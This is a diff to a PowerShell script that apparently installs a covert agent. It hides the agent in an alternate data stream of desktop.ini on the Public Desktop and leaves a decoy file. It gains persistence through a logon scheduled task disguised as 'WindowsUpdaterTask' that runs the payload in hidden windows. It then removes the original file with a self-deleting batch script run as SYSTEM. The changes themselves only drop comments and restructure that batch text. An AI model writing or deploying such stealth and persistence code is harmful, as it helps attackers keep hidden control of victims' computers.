@@ -13,7 +13,6 @@ $publicDesktop = "C:\Users\Public\Desktop"
 $carrierFile = "$publicDesktop\desktop.ini"
 $streamName = "thumbs.db"
 
-# Ensure carrier file exists (create if missing)
 if (-not (Test-Path $carrierFile)) {
     @"
 [.ShellClassInfo]
@@ -51,10 +50,7 @@ Write-Output "[+] Decoy created (does nothing when run)."
 $taskName = "WindowsUpdaterTask"
 $execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
 
-# Delete existing task if any (clean start)
 schtasks /delete /tn $taskName /f 2>$null
-
-# Create new task
 schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
 if ($LASTEXITCODE -eq 0) {
     Write-Output "[+] Scheduled task '$taskName' created. Agent will run at next logon."
@@ -73,8 +69,13 @@ try {
     Write-Output "[-] Original agent still exists – scheduling deletion on next reboot."
     # Create a simple batch script to delete the file on next boot
     $tempScript = "$env:TEMP\del_agent.bat"
-    Set-Content -Path $tempScript -Value "@echo off`ndel /f /q `"$agentPath`"`ndel /f /q `"%~f0`"" -Encoding ASCII
-    # Create a one-time scheduled task to run the batch script as SYSTEM at next boot
+    # Use here-string for batch content
+    $batchContent = @"
+@echo off
+del /f /q "$agentPath"
+del /f /q "%~f0"
+"@
+    Set-Content -Path $tempScript -Value $batchContent -Encoding ASCII
     schtasks /create /tn "TempCleanup" /tr "$tempScript" /sc once /st 00:00 /ru SYSTEM /f | Out-Null
 }
 
